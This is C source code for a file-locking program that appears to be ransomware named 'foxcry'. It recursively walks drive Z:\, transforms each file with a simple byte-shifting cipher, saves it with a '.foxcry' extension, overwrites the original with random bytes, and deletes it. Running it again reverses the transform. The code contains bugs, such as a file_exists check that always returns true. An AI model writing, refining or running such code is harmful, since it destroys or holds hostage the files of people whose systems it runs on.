#include "main.h"

int dir_exists(const char *path);
int file_exists(const char *filename);
void endeda(char* ret, const char* path_old, const char* path_new, int key);
void copy_old_time(struct stat* st, const char* path_new);
int randInRange(int min, int max);
char randomByte();
//void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
//void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext);

int main(int argc, char *argv[])
{
	srand (time(NULL));
	
	struct AES_ctx ctx;
	
	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	strcpy(path, "Z:\\");
	processFilesRecursively(&ctx, path, "foxcry");
	free(path);
	
	return EXIT_SUCCESS;
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0);
		return 1;
	return 0;
}

void endeda(char* ret, const char* path_old, const char* path_new, int key)
{
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char ch;
	char buffer[CHUNK_SIZE];
	size_t bytes;
	int i, j;
	
	fp_old = fopen(path_old,"rb");
	fp_new = fopen(path_new,"wb");
	
	if(fp_old != NULL && fp_new != NULL)
	{
		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
		{
			j = bytes;
			for(i=0; i<bytes; i++)
			{
				if (ret)
				{
					buffer[i]=buffer[i]+key-j;
				}
				else
				{
					buffer[i]=buffer[i]-key+j;
				}
				j--;
			}
			fwrite(buffer, 1, bytes, fp_new);
		}
	}
	
	fclose(fp_new);
	fclose(fp_old);
}

void copy_old_time(struct stat* st, const char* path_new)
{
	struct utimbuf newTimeBuf;
	newTimeBuf.actime  = st->st_atime;
	newTimeBuf.modtime = st->st_mtime;
	utime(path_new, &newTimeBuf);
}

int randInRange(int min, int max)
{
	double scale = 1.0 / (RAND_MAX + 1);
	double range = max - min + 1;
	return min + (int) ( rand() * scale * range );
}

char randomByte()
{
	return (char)randInRange(0, 255);
}

void shredder(struct stat* st, const char* path)
{
	int stat = chmod(path, S_IREAD|S_IWRITE);
	if (!stat)
	{
		off_t size;
		FILE* fp = NULL;
		fp = fopen(path, "rb+");
		if(fp != NULL)
		{
			size = st->st_size;
			
			size_t k = sizeof(char) * CHUNK_SIZE;
			
			long long i = 0;
			char byte[CHUNK_SIZE];
			
			/* Set file descriptor to point to the 0-index byte of file. */
			fseek(fp, 0L, SEEK_SET);
			
			//total_byte_size = count_bytes(size);
			for(i = 0; i < size; i += k)
			{
				/* get random data */
				for(int j = 0; j < sizeof(byte); j++)
					byte[j] = randomByte();

				/* IF conditional to ensure the program does not over overwrite data. */
				if( (size - i) < CHUNK_SIZE )
					{
						k = sizeof(char) * (size - i);
					}

				/* Writes N(k) bytes to file pointer. */
				fwrite(byte, 0x1, k, fp);
			}
		}
		fclose(fp);
	}
}

/* void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
{
	size_t len = strlen(data);
	
	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
	strcpy(str,data);
	
	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
	AES_CBC_encrypt_buffer(ctx, str, len);
	
	*output = (char*)malloc(((len * 2) + 1)* sizeof(char));
	char* ptr = &(*output[0]);
	for (int i = 0; i < len; ++i) {
		 ptr += sprintf(ptr, "%02X", str[i]);
	}
	
	free(str);
}

void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output)
{
	size_t len = strlen(data)/2;
	
	uint8_t* str = (uint8_t*)malloc((len + 1)* sizeof(uint8_t));
	size_t i;
    int value;
    for (i = 0; i < len && sscanf(data + i * 2, "%2x", &value) == 1; i++) {
        str[i] = value;
    }
	
	AES_init_ctx_iv(ctx, (const uint8_t*)key, (const uint8_t*)iv);
	AES_CBC_decrypt_buffer(ctx, str, len);
	
	*output = (char*)malloc((len + 1)* sizeof(char));
	strcpy(*output,str);
	
	free(str);
} */

void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext)
{
    char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			strcpy(path_new, basePath);
            strcat(path_new, "\\");
            strcat(path_new, dp->d_name);
			
			// Check Path contains extension
			char* ret = strstr(path_new, ext);
			if (ret)
			{
				ret--;
				ret[0] = 0;
			}
			else
			{
				strcat(path_new, ".");
				strcat(path_new, ext);
			}
			
			if (dir_exists(path_old))
			{				
				processFilesRecursively(ctx, path_old, ext);
			}
			else
			{
				//printf("%s\n", dp->d_name);
				//printf("%s\n", path_old);
				//printf("%s\n", path_new);
				
				endeda(ret, path_old, path_new, 786);
				
				if (file_exists(path_new))
				{
					struct stat oldStat;
					if (stat(path_old, &oldStat) == 0)
					{
						copy_old_time(&oldStat, path_new);
						shredder(&oldStat, path_old);
					}
					if (remove(path_old) != 0)
					{
						int stat = chmod(path_old, S_IREAD|S_IWRITE);
						if (!stat) remove(path_old);
					}
				}
			}
        }
    }

    closedir(dir);
}
